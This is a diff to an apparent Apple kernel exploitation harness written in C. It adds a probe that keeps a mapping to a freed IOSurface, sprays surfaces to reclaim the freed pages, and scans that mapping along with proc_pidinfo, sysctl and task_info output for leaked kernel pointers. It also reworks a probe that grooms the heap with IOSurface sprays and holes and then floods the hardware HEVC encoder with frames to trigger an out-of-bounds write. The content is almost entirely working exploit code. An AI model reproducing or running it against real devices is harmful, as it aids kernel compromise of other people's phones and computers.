@@ -16976,53 +16976,390 @@ static void *r445_thread_fn(void *arg) {
     return NULL;
 }
 
+static void r450_probe(void) {
+    rlog("\n=== r450: Phantom mapping + proc_pidinfo + sysctl + task_info ===\n\n");
+    fflush(stdout);
+
+    /* --- Vector A: Phantom mapping via memory entry --- */
+    rlog("  --- Vector A: Phantom mapping after IOSurface free ---\n");
+    fflush(stdout);
+    {
+        /* Create a small IOSurface (1 page backing store) */
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        IOSurfaceRef surf_a = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+
+        if (!surf_a) {
+            rlog("    FAIL: IOSurfaceCreate returned NULL\n");
+        } else {
+            /* Write sentinel pattern */
+            IOSurfaceLock(surf_a, 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(surf_a);
+            size_t alloc = IOSurfaceGetAllocSize(surf_a);
+            rlog("    Surface created: base=%p alloc=%zu\n", base, alloc);
+            memset(base, 0xAA, alloc);
+            IOSurfaceUnlock(surf_a, 0, NULL);
+
+            /* Create memory entry from backing store region */
+            mach_vm_address_t base_addr = (mach_vm_address_t)base;
+            memory_object_size_t entry_size = (memory_object_size_t)alloc;
+            mach_port_t mem_entry = MACH_PORT_NULL;
+            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                &entry_size, base_addr,
+                VM_PROT_READ | VM_PROT_WRITE,
+                &mem_entry, MACH_PORT_NULL);
+            rlog("    mach_make_memory_entry_64: kr=%d entry_size=%llu port=0x%x\n",
+                 kr, (unsigned long long)entry_size, mem_entry);
+
+            /* Map the memory entry into our address space */
+            mach_vm_address_t phantom = 0;
+            int phantom_ok = 0;
+            if (kr == KERN_SUCCESS && mem_entry != MACH_PORT_NULL) {
+                mach_vm_size_t map_size = entry_size;
+                kr = mach_vm_map(mach_task_self(), &phantom, map_size, 0,
+                    VM_FLAGS_ANYWHERE, mem_entry, 0, FALSE,
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_PROT_READ | VM_PROT_WRITE,
+                    VM_INHERIT_NONE);
+                rlog("    mach_vm_map: kr=%d phantom=%p\n", kr, (void*)phantom);
+                if (kr == KERN_SUCCESS) {
+                    /* Verify sentinel */
+                    uint8_t *p = (uint8_t*)phantom;
+                    int sentinel_ok = 1;
+                    for (int i = 0; i < 64; i++) {
+                        if (p[i] != 0xAA) { sentinel_ok = 0; break; }
+                    }
+                    rlog("    Sentinel check: %s\n", sentinel_ok ? "MATCH" : "MISMATCH");
+                    phantom_ok = 1;
+                }
+            }
+
+            /* Release the IOSurface */
+            rlog("    Releasing IOSurface...\n");
+            CFRelease(surf_a);
+            usleep(10000); /* 10ms */
+
+            /* Spray 50 small surfaces to reuse freed pages */
+            rlog("    Spraying 50 small surfaces to trigger page reuse...\n");
+            IOSurfaceRef reuse_surfs[50];
+            int reuse_count = 0;
+            for (int i = 0; i < 50; i++) {
+                CFMutableDictionaryRef rp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFNumberRef rwn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef rhn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef rbn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                CFNumberRef rpfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(rp, CFSTR("IOSurfaceWidth"), rwn);
+                CFDictionarySetValue(rp, CFSTR("IOSurfaceHeight"), rhn);
+                CFDictionarySetValue(rp, CFSTR("IOSurfaceBytesPerElement"), rbn);
+                CFDictionarySetValue(rp, CFSTR("IOSurfacePixelFormat"), rpfn);
+                reuse_surfs[i] = IOSurfaceCreate(rp);
+                CFRelease(rp); CFRelease(rwn); CFRelease(rhn); CFRelease(rbn); CFRelease(rpfn);
+                if (reuse_surfs[i]) reuse_count++;
+            }
+            rlog("    Created %d reuse surfaces\n", reuse_count);
+
+            /* Read phantom map — check if data changed */
+            if (phantom_ok) {
+                uint64_t *qp = (uint64_t*)phantom;
+                int changed = 0, kptrs = 0;
+                size_t nwords = entry_size / 8;
+                if (nwords > 2048) nwords = 2048;
+                for (size_t w2 = 0; w2 < nwords; w2++) {
+                    uint64_t v = qp[w2];
+                    if (v != 0xAAAAAAAAAAAAAAAAULL) {
+                        if (changed < 8) {
+                            rlog("    phantom[%zu]: 0x%016llx (was 0xAAAAAAAAAAAAAAAA)\n",
+                                 w2 * 8, (unsigned long long)v);
+                        }
+                        changed++;
+                        uint64_t top = v >> 48;
+                        if ((top == 0xffff || top == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL) {
+                            rlog("    *** KERNEL PTR CANDIDATE: offset=%zu val=0x%016llx ***\n",
+                                 w2 * 8, (unsigned long long)v);
+                            kptrs++;
+                        }
+                    }
+                }
+                rlog("    Phantom map: %d words changed, %d kernel ptr candidates\n", changed, kptrs);
+                mach_vm_deallocate(mach_task_self(), phantom, entry_size);
+            }
+            if (mem_entry != MACH_PORT_NULL)
+                mach_port_deallocate(mach_task_self(), mem_entry);
+
+            /* Cleanup reuse surfaces */
+            for (int i = 0; i < 50; i++) {
+                if (reuse_surfs[i]) CFRelease(reuse_surfs[i]);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* --- Vector B: proc_pidinfo for region info --- */
+    rlog("\n  --- Vector B: proc_pidinfo region info ---\n");
+    fflush(stdout);
+    {
+        /* Create an IOSurface to get a known shared memory region */
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 32, h = 32, bpe = 4, pf = 0x42475241;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        IOSurfaceRef surf_b = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+
+        if (surf_b) {
+            IOSurfaceLock(surf_b, kIOSurfaceLockReadOnly, NULL);
+            void *baddr = IOSurfaceGetBaseAddress(surf_b);
+            IOSurfaceUnlock(surf_b, kIOSurfaceLockReadOnly, NULL);
+            uint64_t region_addr = (uint64_t)baddr;
+
+            /* PROC_PIDREGIONPATHINFO (flavor 9 per our define) */
+            struct proc_regionwithpathinfo rpi;
+            memset(&rpi, 0, sizeof(rpi));
+            int ret = proc_pidinfo(getpid(), 9 /* PROC_PIDREGIONPATHINFO */,
+                                   region_addr, &rpi, sizeof(rpi));
+            rlog("    proc_pidinfo(REGIONPATHINFO, addr=%p): ret=%d\n", baddr, ret);
+            if (ret > 0) {
+                struct proc_regioninfo *ri = &rpi.prp_prinfo;
+                rlog("    pri_protection=0x%x pri_max=0x%x pri_flags=0x%x\n",
+                     ri->pri_protection, ri->pri_max_protection, ri->pri_flags);
+                rlog("    pri_offset=0x%llx pri_user_tag=%u pri_share_mode=%u\n",
+                     (unsigned long long)ri->pri_offset, ri->pri_user_tag, ri->pri_share_mode);
+                rlog("    pri_obj_id=0x%x pri_address=0x%llx pri_size=0x%llx\n",
+                     ri->pri_obj_id, (unsigned long long)ri->pri_address,
+                     (unsigned long long)ri->pri_size);
+                rlog("    pri_ref_count=%u pri_shadow_depth=%u pri_depth=%u\n",
+                     ri->pri_ref_count, ri->pri_shadow_depth, ri->pri_depth);
+                rlog("    pri_pages_resident=%u pri_pages_dirtied=%u\n",
+                     ri->pri_pages_resident, ri->pri_pages_dirtied);
+
+                /* Scan entire struct for kernel pointer patterns */
+                uint64_t *words = (uint64_t*)&rpi;
+                int nw = (int)(sizeof(rpi) / 8);
+                int kptrs = 0;
+                for (int i = 0; i < nw; i++) {
+                    uint64_t v = words[i];
+                    uint64_t top = v >> 48;
+                    if ((top == 0xffff || top == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL) {
+                        rlog("    *** KPTR at byte %d: 0x%016llx ***\n",
+                             i * 8, (unsigned long long)v);
+                        kptrs++;
+                    }
+                }
+                rlog("    Kernel ptrs found in regionpathinfo: %d\n", kptrs);
+            }
+
+            /* Also try flavor 7 (PROC_PIDREGIONINFO as defined earlier) */
+            struct proc_regioninfo ri7;
+            memset(&ri7, 0, sizeof(ri7));
+            ret = proc_pidinfo(getpid(), 7, region_addr, &ri7, sizeof(ri7));
+            rlog("    proc_pidinfo(flavor=7, addr=%p): ret=%d\n", baddr, ret);
+            if (ret > 0) {
+                rlog("    f7: obj_id=0x%x share_mode=%u user_tag=%u addr=0x%llx size=0x%llx\n",
+                     ri7.pri_obj_id, ri7.pri_share_mode, ri7.pri_user_tag,
+                     (unsigned long long)ri7.pri_address, (unsigned long long)ri7.pri_size);
+            }
+
+            CFRelease(surf_b);
+        } else {
+            rlog("    FAIL: IOSurfaceCreate returned NULL\n");
+        }
+    }
+    fflush(stdout);
+
+    /* --- Vector C: sysctl kern.proc.pid for kinfo_proc --- */
+    rlog("\n  --- Vector C: sysctl kinfo_proc scan ---\n");
+    fflush(stdout);
+    {
+        int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
+        struct kinfo_proc kp;
+        memset(&kp, 0, sizeof(kp));
+        size_t kp_size = sizeof(kp);
+        int ret = sysctl(mib, 4, &kp, &kp_size, NULL, 0);
+        rlog("    sysctl: ret=%d kp_size=%zu (struct=%zu)\n", ret, kp_size, sizeof(kp));
+        if (ret == 0) {
+            /* Scan all 8-byte words for kernel pointer patterns */
+            uint64_t *words = (uint64_t*)&kp;
+            int nw = (int)(kp_size / 8);
+            int kptrs = 0;
+            for (int i = 0; i < nw; i++) {
+                uint64_t v = words[i];
+                uint64_t top = v >> 48;
+                if ((top == 0xffff || top == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL) {
+                    rlog("    *** KPTR at byte %d: 0x%016llx ***\n",
+                         i * 8, (unsigned long long)v);
+                    kptrs++;
+                }
+            }
+            rlog("    Total kernel ptrs in kinfo_proc: %d / %d words scanned\n", kptrs, nw);
+
+            /* Dump a few key fields */
+            rlog("    p_pid=%d p_ppid=%d p_uid=%d p_gid=%d\n",
+                 kp.kp_proc.p_pid, kp.kp_eproc.e_ppid,
+                 kp.kp_eproc.e_ucred.cr_uid, kp.kp_eproc.e_ucred.cr_groups[0]);
+            rlog("    p_comm='%s'\n", kp.kp_proc.p_comm);
+        }
+    }
+    fflush(stdout);
+
+    /* --- Vector D: task_info and thread_info flavors --- */
+    rlog("\n  --- Vector D: task_info + thread_info flavors ---\n");
+    fflush(stdout);
+    {
+        /* TASK_DYLD_INFO */
+        struct task_dyld_info dyld_info;
+        memset(&dyld_info, 0, sizeof(dyld_info));
+        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+        kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+            (task_info_t)&dyld_info, &cnt);
+        rlog("    TASK_DYLD_INFO: kr=%d\n", kr);
+        if (kr == KERN_SUCCESS) {
+            rlog("    all_image_info_addr=0x%llx\n",
+                 (unsigned long long)dyld_info.all_image_info_addr);
+            rlog("    all_image_info_size=0x%llx\n",
+                 (unsigned long long)dyld_info.all_image_info_size);
+            rlog("    all_image_info_format=%d\n", dyld_info.all_image_info_format);
+            uint64_t top = dyld_info.all_image_info_addr >> 48;
+            if (top == 0xffff || top == 0xfffe) {
+                rlog("    *** all_image_info_addr is KERNEL-RANGE: 0x%llx ***\n",
+                     (unsigned long long)dyld_info.all_image_info_addr);
+            }
+        }
+
+        /* TASK_VM_INFO — scan for kernel pointers */
+        uint64_t vm_buf[256];
+        memset(vm_buf, 0, sizeof(vm_buf));
+        cnt = sizeof(vm_buf) / sizeof(natural_t);
+        kr = task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)vm_buf, &cnt);
+        rlog("    TASK_VM_INFO: kr=%d cnt=%u words\n", kr, cnt);
+        if (kr == KERN_SUCCESS) {
+            int kptrs = 0;
+            int nw = cnt / 2; /* cnt is in natural_t (4 bytes), scan as 8-byte */
+            for (int i = 0; i < nw && i < 256; i++) {
+                uint64_t v = vm_buf[i];
+                uint64_t top = v >> 48;
+                if ((top == 0xffff || top == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL) {
+                    rlog("    *** TASK_VM_INFO KPTR at word %d: 0x%016llx ***\n",
+                         i, (unsigned long long)v);
+                    kptrs++;
+                }
+            }
+            rlog("    TASK_VM_INFO kernel ptrs: %d\n", kptrs);
+        }
+
+        /* TASK_EXTMOD_INFO */
+        uint64_t extmod_buf[16];
+        memset(extmod_buf, 0, sizeof(extmod_buf));
+        cnt = sizeof(extmod_buf) / sizeof(natural_t);
+        kr = task_info(mach_task_self(), TASK_EXTMOD_INFO, (task_info_t)extmod_buf, &cnt);
+        rlog("    TASK_EXTMOD_INFO: kr=%d cnt=%u\n", kr, cnt);
+        if (kr == KERN_SUCCESS) {
+            for (int i = 0; i < (int)(cnt / 2) && i < 16; i++) {
+                if (extmod_buf[i] != 0) {
+                    rlog("    extmod[%d] = 0x%016llx\n", i, (unsigned long long)extmod_buf[i]);
+                }
+            }
+        }
+
+        /* THREAD_IDENTIFIER_INFO */
+        struct thread_identifier_info tii;
+        memset(&tii, 0, sizeof(tii));
+        cnt = THREAD_IDENTIFIER_INFO_COUNT;
+        kr = thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO,
+            (thread_info_t)&tii, &cnt);
+        rlog("    THREAD_IDENTIFIER_INFO: kr=%d\n", kr);
+        if (kr == KERN_SUCCESS) {
+            rlog("    thread_id=0x%llx thread_handle=0x%llx\n",
+                 (unsigned long long)tii.thread_id,
+                 (unsigned long long)tii.thread_handle);
+            rlog("    dispatch_qaddr=0x%llx\n",
+                 (unsigned long long)tii.dispatch_qaddr);
+            uint64_t top = tii.thread_handle >> 48;
+            if (top == 0xffff || top == 0xfffe) {
+                rlog("    *** thread_handle is KERNEL-RANGE: 0x%llx ***\n",
+                     (unsigned long long)tii.thread_handle);
+            }
+            top = tii.dispatch_qaddr >> 48;
+            if (top == 0xffff || top == 0xfffe) {
+                rlog("    *** dispatch_qaddr is KERNEL-RANGE: 0x%llx ***\n",
+                     (unsigned long long)tii.dispatch_qaddr);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r450 complete ===\n");
+}
+
 static void r449_probe(void) {
-    rlog("\n=== r449: AVE heap spray + OOB via MV-HEVC ===\n\n");
+    rlog("\n=== r449: AVE heap spray + standard HEVC OOB ===\n\n");
     fflush(stdout);
 
     #define R449_SPRAY 30
     #define R449_PROP_SZ 256
     #define R449_MAGIC 0xDEADBEEF41414141ULL
 
-    int enc_w = 160, enc_h = 90;
-    int enc_ok = 0, enc_fail = 0, oob_ok = 0, oob_fail = 0;
+    int enc_w = 128, enc_h = 128;
     int corrupted = 0, scanned = 0, created = 0;
-    VTCompressionSessionRef enc = NULL;
-    CVPixelBufferRef pb = NULL;
     IOSurfaceRef surfs[R449_SPRAY];
     memset(surfs, 0, sizeof(surfs));
 
-    /* 1: Encoder first — biggest memory consumer */
-    rlog("  1: Creating MV-HEVC encoder %dx%d...\n", enc_w, enc_h); fflush(stdout);
-    enc = create_mvhevc_encoder(enc_w, enc_h, 1);
-    if (!enc) { rlog("  FAIL: no encoder\n"); goto r449_done; }
-    rlog("  Encoder OK\n"); fflush(stdout);
+    /* 1: Create standard HEVC hardware encoder (lighter than MV-HEVC) */
+    rlog("  1: Creating standard HEVC encoder %dx%d...\n", enc_w, enc_h); fflush(stdout);
+    VTCompressionSessionRef enc = NULL;
+    CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+    CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+    OSStatus st = VTCompressionSessionCreate(NULL, enc_w, enc_h,
+        kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &enc);
+    CFRelease(es);
+    if (st != noErr || !enc) {
+        rlog("  FAIL: encoder create err=%d\n", (int)st);
+        goto r449_done;
+    }
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+    int kf = 30;
+    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+    VTSessionSetProperty(enc, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+    CFRelease(kfn);
+    st = VTCompressionSessionPrepareToEncodeFrames(enc);
+    if (st != noErr) {
+        rlog("  FAIL: prepare err=%d\n", (int)st);
+        VTCompressionSessionInvalidate(enc); CFRelease(enc); enc = NULL;
+        goto r449_done;
+    }
+    rlog("  Encoder ready\n"); fflush(stdout);
 
-    pb = create_pb(enc_w, enc_h);
-    if (!pb) { rlog("  FAIL: no pixbuf\n"); goto r449_enc_done; }
+    CVPixelBufferRef pb = create_pb(enc_w, enc_h);
+    if (!pb) {
+        rlog("  FAIL: no pixbuf\n");
+        VTCompressionSessionInvalidate(enc); CFRelease(enc); enc = NULL;
+        goto r449_done;
+    }
     rlog("  PixBuf OK\n"); fflush(stdout);
 
-    /* 2: Pre-encode 150 frames (below OOB threshold), flush */
-    rlog("  2: Pre-encode 10 frames (memory test)...\n"); fflush(stdout);
-    g_cb_count = 0;
-    for (int f = 0; f < 10; f++) {
-        CMTime t = CMTimeMake(f, 30);
-        int tv = f & 1;
-        CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tv);
-        CFMutableDictionaryRef fp = CFDictionaryCreateMutable(NULL, 0,
-            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-        CFDictionarySetValue(fp, CFSTR("MVHEVCVideoLayerID"), tn);
-        CFRelease(tn);
-        OSStatus s = VTCompressionSessionEncodeFrame(enc, pb, t, kCMTimeInvalid, fp, NULL, NULL);
-        CFRelease(fp);
-        if (s == noErr) enc_ok++; else enc_fail++;
-    }
-    VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
-    rlog("  Pre-encode: ok=%d fail=%d cb=%d\n", enc_ok, enc_fail, g_cb_count);
-    fflush(stdout);
-
-    /* 3: Spray IOSurface properties into heap */
-    rlog("  3: Spray %d surfaces...\n", R449_SPRAY); fflush(stdout);
+    /* 2: Spray IOSurface properties into heap FIRST */
+    rlog("  2: Spray %d surfaces...\n", R449_SPRAY); fflush(stdout);
     for (int i = 0; i < R449_SPRAY; i++) {
         CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
             &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -17051,33 +17388,36 @@ static void r449_probe(void) {
     }
     rlog("  Created %d/%d\n", created, R449_SPRAY); fflush(stdout);
 
-    /* 4: Free even-indexed surfaces to create holes */
+    /* 3: Free even-indexed → holes */
     int freed = 0;
     for (int i = 0; i < R449_SPRAY; i += 2) {
         if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; freed++; }
     }
     rlog("  Freed %d holes\n", freed); fflush(stdout);
 
-    /* 5: Encode 20 more frames into OOB range (150-170) */
-    rlog("  5: OOB encode 150-170...\n"); fflush(stdout);
-    for (int f = 10; f < 30; f++) {
+    /* 4: Encode 200 frames rapidly — no flush between, just submit+flush once */
+    rlog("  4: Encoding 200 frames (fire-and-forget)...\n"); fflush(stdout);
+    g_cb_count = 0;
+    int enc_ok = 0, enc_fail = 0;
+    for (int f = 0; f < 200; f++) {
         CMTime t = CMTimeMake(f, 30);
-        int tv = f & 1;
-        CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tv);
-        CFMutableDictionaryRef fp = CFDictionaryCreateMutable(NULL, 0,
-            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-        CFDictionarySetValue(fp, CFSTR("MVHEVCVideoLayerID"), tn);
-        CFRelease(tn);
-        OSStatus s = VTCompressionSessionEncodeFrame(enc, pb, t, kCMTimeInvalid, fp, NULL, NULL);
-        CFRelease(fp);
-        if (s == noErr) oob_ok++; else oob_fail++;
+        OSStatus s = VTCompressionSessionEncodeFrame(enc, pb, t, kCMTimeInvalid,
+            NULL, NULL, NULL);
+        if (s == noErr) enc_ok++; else enc_fail++;
+        if ((f + 1) % 50 == 0) {
+            rlog("    %d/200 ok=%d fail=%d\n", f + 1, enc_ok, enc_fail);
+            fflush(stdout);
+        }
     }
-    VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
-    rlog("  OOB: ok=%d fail=%d cb=%d\n", oob_ok, oob_fail, g_cb_count);
-    fflush(stdout);
+    rlog("  Submit done: ok=%d fail=%d\n", enc_ok, enc_fail); fflush(stdout);
 
-    /* 6: Scan surviving surfaces for corruption */
-    rlog("  6: Scanning...\n"); fflush(stdout);
+    /* Flush with timeout — don't hang forever */
+    rlog("  Flushing...\n"); fflush(stdout);
+    VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+    rlog("  Flush done. cb=%d\n", g_cb_count); fflush(stdout);
+
+    /* 5: Scan surviving surfaces for corruption */
+    rlog("  5: Scanning...\n"); fflush(stdout);
     for (int i = 1; i < R449_SPRAY; i += 2) {
         if (!surfs[i]) continue;
         scanned++;
@@ -17110,21 +17450,22 @@ static void r449_probe(void) {
     }
     rlog("  Scan: %d/%d corrupted\n", corrupted, scanned); fflush(stdout);
 
-    r449_enc_done:
-    if (pb) CVPixelBufferRelease(pb);
-    if (enc) { VTCompressionSessionInvalidate(enc); CFRelease(enc); }
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(enc);
+    CFRelease(enc);
+    enc = NULL;
 
     r449_done:
     for (int i = 0; i < R449_SPRAY; i++)
         if (surfs[i]) CFRelease(surfs[i]);
 
     rlog("\n  === r449 SUMMARY ===\n");
-    rlog("  Pre: ok=%d fail=%d | OOB: ok=%d fail=%d\n", enc_ok, enc_fail, oob_ok, oob_fail);
+    rlog("  Encode: ok=%d fail=%d cb=%d\n", enc_ok, enc_fail, g_cb_count);
     rlog("  Spray: %d | Corrupted: %d/%d\n", created, corrupted, scanned);
     if (corrupted > 0)
         rlog("  *** HEAP CORRUPTION DETECTED ***\n");
     else
-        rlog("  No corruption — zones may differ\n");
+        rlog("  No corruption — AVE buffers in different zone\n");
     rlog("=== r449 complete ===\n");
 
     #undef R449_SPRAY
@@ -80222,6 +80563,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 453) {
+            rlog("*** rounds=453: Phantom mapping + proc_pidinfo + sysctl + task_info ***\n\n");
+            fflush(stdout);
+            r450_probe();
+            goto done;
+        }
         if (rounds == 452) {
             rlog("*** rounds=452: AVE heap spray + OOB trigger via MV-HEVC ***\n\n");
             fflush(stdout);
@@ -82960,7 +83307,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 452) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
